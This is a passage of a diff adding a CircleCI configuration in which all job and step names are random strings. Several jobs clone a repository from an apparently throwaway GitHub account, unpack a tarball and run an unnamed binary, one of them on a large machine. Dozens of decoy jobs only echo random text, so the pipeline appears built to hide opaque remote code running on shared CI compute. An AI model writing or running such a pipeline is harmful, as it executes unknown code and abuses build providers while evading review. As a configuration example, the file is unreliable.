+          name: gqmzwppmqppz
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: rxlbke
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  ijivdn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: gaghvpbdb
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'sxjluugilx llqgqvdjqpkkqzklz' > /tmp/oygltyxbc/sdlmlsguen
+            ls -la /tmp/oygltyxbc/sdlmlsguen
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'sdlmlsguen'
+  zxjri:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: bzoclp
+          command: |
+            du --bytes /tmp/oygltyxbc/sdlmlsguen || true
+      - run:
+          name: mdfpnfqoqfibxf
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: pkjfhzeovgcvh
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+
+  oavyxff:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: qgvimi
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'piwmgqafhkxsig itgksgrabxynhftbo' > /tmp/oygltyxbc/acglkhrk
+            ls -la /tmp/oygltyxbc/acglkhrk
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'acglkhrk'
+  knkzk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: bphsbntrs
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'zawdlbftewxwhpfyk hskzcouksvkugzsk' > /tmp/oygltyxbc/tmlsox
+            ls -la /tmp/oygltyxbc/tmlsox
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'tmlsox'
+  erxeohc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: ukpegfabxp
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'cohaghcxzbu zokufmspszwixqyb' > /tmp/oygltyxbc/feajvb
+            ls -la /tmp/oygltyxbc/feajvb
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'feajvb'
+  lfkxdykdydp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: unlsirsu
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'jiomtkiemoyiviabac mnkriytmvaqirekw' > /tmp/oygltyxbc/dtiiti
+            ls -la /tmp/oygltyxbc/dtiiti
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'dtiiti'
+  mglvjf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: pdkcynaknzdtu
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'hchbogatlgr ywdfkfqvfr' > /tmp/oygltyxbc/giyiiqpds
+            ls -la /tmp/oygltyxbc/giyiiqpds
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'giyiiqpds'
+  rpliznkrqvxskic:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: shsurdbxe
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'lygkahfijoeovk znrltgmtzbp' > /tmp/oygltyxbc/qzmmknzcpkjkug
+            ls -la /tmp/oygltyxbc/qzmmknzcpkjkug
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'qzmmknzcpkjkug'
+  qoulokbm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: mfoqvlhbxdml
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'kimoagdord hjzpmfryvxds' > /tmp/oygltyxbc/kwnffsgbpgzm
+            ls -la /tmp/oygltyxbc/kwnffsgbpgzm
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'kwnffsgbpgzm'
+  uafidlay:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: ycwalafzlaxkm
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'gipftwtilt iurwanlzljvauy' > /tmp/oygltyxbc/sbhypwfjqld
+            ls -la /tmp/oygltyxbc/sbhypwfjqld
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'sbhypwfjqld'
+  anzugfiyq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: mlpdjj
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'lundrpmjvmzi eyuplcdrpomxdl' > /tmp/oygltyxbc/wikhkaqrmu
+            ls -la /tmp/oygltyxbc/wikhkaqrmu
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'wikhkaqrmu'
+workflows:
+  pzlslfbpd:
+    jobs:
+      - pxgttdap
+      - oavyxff:
+          requires:
+            - pxgttdap
+      - htiolipsho:
+          requires:
+            - oavyxff
+      - ptghfexjghn:
+          requires:
+            - oavyxff
+      - knkzk:
+          requires:
+            - ptghfexjghn
+      - cumkhnls:
+          requires:
+            - knkzk
+      - khpmlfnkreamolv:
+          requires:
+            - knkzk
+      - erxeohc:
+          requires:
+            - khpmlfnkreamolv
+      - mvqowpmeubxka:
+          requires:
+            - erxeohc
+      - hbdzwooyoxltk:
+          requires:
+            - erxeohc
+      - lfkxdykdydp:
+          requires:
+            - hbdzwooyoxltk
+      - lfvcsjjoifcephx:
+          requires:
+            - lfkxdykdydp
+      - heylv:
+          requires:
+            - lfkxdykdydp
+      - mglvjf:
+          requires:
+            - heylv
+      - rrjvoohk:
+          requires:
+            - mglvjf
+      - oswuardmynl:
+          requires:
+            - mglvjf
+      - rpliznkrqvxskic:
+          requires:
+            - oswuardmynl
+      - qztznqaecoml:
+          requires:
+            - rpliznkrqvxskic
+      - aqclvxxmojez:
+          requires:
+            - rpliznkrqvxskic
+      - qoulokbm:
+          requires:
+            - aqclvxxmojez
+      - zusggawq:
+          requires:
+            - qoulokbm
+      - kcdzghr:
+          requires:
+            - qoulokbm
+      - uafidlay:
+          requires:
+            - kcdzghr
+      - aqrqf:
+          requires:
+            - uafidlay
+      - rkwps:
+          requires:
+            - uafidlay
+      - anzugfiyq:
+          requires:
+            - rkwps
+      - owqxxwrvubwrbzy:
+          requires:
+            - anzugfiyq
+      - lurmvz
+      - zpinrnkczvwd:
+          requires:
+            - lurmvz
+      - rgjlf:
+          requires:
+            - lurmvz
+      - kbhwm:
+          requires:
+            - rgjlf
+      - iyxzibnri:
+          requires:
+            - rgjlf
+      - bfqklzlvqvjfi:
+          requires:
+            - iyxzibnri
+      - uiqqjspcfqp:
+          requires:
+            - iyxzibnri
+      - gzytpsrytk:
+          requires:
+            - uiqqjspcfqp
+      - sdlelxaijezofbq:
+          requires:
+            - uiqqjspcfqp
+      - jqbzrzhlt:
+          requires:
+            - sdlelxaijezofbq
+      - igrrpkbhzie:
+          requires:
+            - sdlelxaijezofbq
+      - adkbnzhkr:
+          requires:
+            - igrrpkbhzie
+      - mdlypgbdh:
+          requires:
+            - igrrpkbhzie
+      - olmacibfmigpebm:
+          requires:
+            - mdlypgbdh
+      - qhurxolqgef:
+          requires:
+            - mdlypgbdh
+      - jaxvsmcdt:
+          requires:
+            - qhurxolqgef
+      - glvxeaczrhn:
+          requires:
+            - qhurxolqgef
+      - xqbaz:
+          requires:
+            - glvxeaczrhn
+      - qnfxhqmlombh:
+          requires:
+            - glvxeaczrhn
+      - vfkmm:
+          requires:
+            - qnfxhqmlombh
+      - momwvgdlxredizn
+      - iiypym:
+          requires:
+            - momwvgdlxredizn
+      - zpkukki:
+          requires:
+            - momwvgdlxredizn
+      - hwuorzk:
+          requires:
+            - zpkukki
+      - eblfazkh:
+          requires:
+            - zpkukki
+      - uiirahkwujlhf:
+          requires:
+            - eblfazkh
+      - fmruanlega:
+          requires:
+            - eblfazkh
+      - xuqnixregvk:
+          requires:
+            - fmruanlega
+      - twzjx:
+          requires:
+            - fmruanlega
+      - tvuelekevuw:
+          requires:
+            - twzjx
+      - ijivdn:
+          requires:
+            - twzjx
+      - zxjri:
+          requires:
+            - ijivdn
+      - eaanuqkbgbvirr:
+          requires:
+            - ijivdn
+      - zsryp:
+          requires:
+            - eaanuqkbgbvirr
+      - ekiup:
+          requires:
+            - eaanuqkbgbvirr
+      - enlxxaphnjwm:
+          requires:
+            - ekiup
+      - gxikv:
+          requires:
+            - ekiup
+      - yetidguujgsx:
+          requires:
+            - gxikv
+      - nklpahzbvt:
+          requires:
+            - gxikv
+      - jszurvwbuzhfk:
+          requires:
+            - nklpahzbvt
+      - buoydm:
+          requires:
+            - nklpahzbvt
+      - ebctodxeuk:
+          requires:
+            - buoydm
